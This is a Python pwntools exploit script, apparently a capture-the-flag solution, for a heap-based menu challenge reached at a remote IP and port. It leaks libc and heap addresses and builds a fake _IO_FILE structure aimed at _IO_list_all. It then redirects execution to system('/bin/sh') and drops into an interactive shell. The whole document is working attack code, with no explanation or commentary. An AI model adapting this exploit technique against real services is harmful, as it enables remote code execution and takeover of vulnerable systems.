from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

binary='./pwn.dms'
elf=ELF(binary)
debug=0
if debug:
	io=process(binary)
else:
	io = remote("183.60.136.226",14823)
onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]

libc = ELF("./libc.so")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
def add(name,size,c):
	ru('Input your choice:')
	sl('1')
	ru('Member name:')
	s(name)
	ru('Description size:')#[0,0x40]
	sl(str(size))
	ru('Description:')
	sl(c)
def throw(i):
	ru('Input your choice:')
	sl('2')
	ru("index:")
	sl(str(i))

def show(i):
	ru('Input your choice:')
	sl('3')
	ru("index:")
	sl(str(i))
	ru('The Description:')
add('1\n',0x40,'1')
throw(0)
add('1\n',0x30-8,'1')
throw(0)
add('1\n',0x20-8,'1')#0
add('1\n',0x40-8,'1')#1
add('1\n',0x40-8,'2')#2
add('1\n',0x40-8,'3')#3
add('1\n',0x40-8,'4')#4
add('1\n',0x40-8,'5')#5
add('1\n',0x40-8,'6')#6
add('1\n',0x40-8,'7')#7
add('0'*0x500,0,'1')#8
show(8)
libc.address=u64(r(6).ljust(8,b'\x00'))-0x3c4b31
log.success(hex(libc.address))

throw(0)
throw(8)

add('1\n',0x20-8,'')#0
show(0)

heapbase=u64(r(6).ljust(8,b'\x00'))-0x80
log.success(hex(heapbase))

throw(0)
iofile=b'/bin/sh\x00'  
iofile+=p64(0x61)  
iofile+=p64(libc.address)
iofile+=p64(libc.symbols['_IO_list_all']-0x10)
iofile=iofile.ljust(0x20,b'\x00')
iofile+=p64(0)
iofile+=p64(1)
iofile=iofile.ljust(0xc0,b'\x00')
iofile+=p64(0xffffffffffffffff)
iofile=iofile.ljust(0xd8,b'\x00')
iofile+=p64(heapbase+0x1b0)
add('1\n',0,'1'*0x10+iofile) 

throw(5)
c=p64(0)*3
c+=p64(libc.symbols['system'])
add('1\n',0x40-8,c)#7
ru('Input your choice:')
sl('1')
ru('Member name:')
s('1\n')
ru('Description size:')#[0,0x40]
sl(str(33))
#gdb.attach(io)
io.interactive()